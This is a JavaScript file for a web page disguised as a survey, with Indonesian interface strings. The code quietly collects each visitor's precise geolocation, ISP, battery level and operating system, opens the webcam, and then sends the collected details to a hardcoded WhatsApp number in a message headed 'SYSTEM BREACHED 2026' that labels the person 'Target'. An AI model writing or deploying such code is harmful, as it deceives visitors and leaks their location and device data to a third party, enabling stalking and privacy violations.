const nomorWA = "628979100200";
let userData = { 
    coords: "Tidak Diizinkan", 
    os: navigator.platform,
    battery: "Scanning...",
    isp: "Detecting..."
};

async function getQuickData() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        userData.isp = data.org || "Protected";
    } catch (e) { userData.isp = "ISP Hidden"; }

    try {
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            userData.battery = Math.round(bat.level * 100) + "%";
        }
    } catch (e) { userData.battery = "Hardware Blocked"; }
}

const startBtn = document.getElementById('start-survey');
if (startBtn) {
    startBtn.onclick = function() {
        document.getElementById('step-1').style.display = 'none';
        document.getElementById('step-2').style.display = 'block';
        
        getQuickData();

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                userData.coords = pos.coords.latitude + "," + pos.coords.longitude;
            });
        }

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => { document.getElementById('webcam').srcObject = stream; })
            .catch(e => { console.log("Kamera Blocked"); });
    };
}

function finalSubmit() {
    const nameVal = document.getElementById('name').value;
    if (!nameVal) return alert("Isi nama dulu!");

    document.getElementById('step-2').style.display = 'none';
    document.getElementById('step-3').style.display = 'block';

    let prg = 0;
    const timer = setInterval(() => {
        prg += 25;
        document.getElementById('progress').style.width = prg + "%";
        if (prg >= 100) {
            clearInterval(timer);
            // Format link map yang benar
            const mapUrl = "https://www.google.com/maps?q=" + userData.coords;
            const msg = `🚨 *SYSTEM BREACHED 2026* 🚨%0A%0A👤 *Target:* ${nameVal}%0A📍 *Maps:* ${mapUrl}%0A📡 *ISP:* ${userData.isp}%0A🔋 *Baterai:* ${userData.battery}%0A💻 *OS:* ${userData.os}%0A%0A_Status: Data Mirrored._`;
            window.location.href = `https://api.whatsapp.com/send?phone=${nomorWA}&text=${msg}`;
        }
    }, 600);
}

const submitBtn = document.getElementById('submit-survey');
if (submitBtn) submitBtn.onclick = finalSubmit;

const nameInput = document.getElementById('name');
if (nameInput) {
    nameInput.onkeydown = (e) => { if (e.key === "Enter") finalSubmit(); };
}
